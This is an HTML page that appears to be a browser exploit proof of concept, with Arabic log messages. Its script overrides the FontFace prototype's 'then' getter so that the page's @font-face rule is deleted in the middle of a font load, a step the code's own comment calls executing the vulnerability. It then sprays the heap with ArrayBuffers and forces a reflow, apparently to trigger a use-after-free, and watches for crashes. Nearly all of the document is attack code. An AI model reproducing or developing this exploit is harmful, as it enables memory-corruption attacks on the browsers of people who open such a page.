<!DOCTYPE html>
<html>
<head>
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body style="margin:0; padding:20px; font-family:monospace; background:black; color:white;">
    <div id="log" style="position:fixed; top:0; left:0; width:100%; height:100%; padding:20px; overflow:auto; white-space:pre-wrap;"></div>

<script>
    function log(m, color) {
        let el = document.createElement('div');
        el.innerHTML = "[LOG]: " + m;
        document.getElementById('log').appendChild(el);
        if (color) document.body.style.background = color;
    }

    window.onerror = function(msg, url, line) {
        log("CRASH DETECTED: " + msg + " at line " + line, "#800");
    };

    log("1. بدء العمليات...", "green");

    try {
        let spray = [];
        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        document.fonts.add(A);

        log("2. جاري تنفيذ الـ Trigger...", "yellow");
        
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                // تنفيذ الثغرة
                document.getElementById('s').sheet.deleteRule(0);
                
                // الـ Heap Spray
                log("3. جاري الـ Heap Spray...", "orange");
                for (let i = 0; i < 50; i++) {
                    spray.push(new ArrayBuffer(0x1000));
                }
                
                document.body.offsetTop; // Trigger Reflow
                log("4. تم تنفيذ الـ Reflow (اللحظة الحاسمة)...", "purple");
                return undefined;
            }
        });

        document.fonts.load('1em x', 'AB');

    } catch(e) {
        log("ERROR: " + e.message, "red");
    }
</script>
</body>
</html>
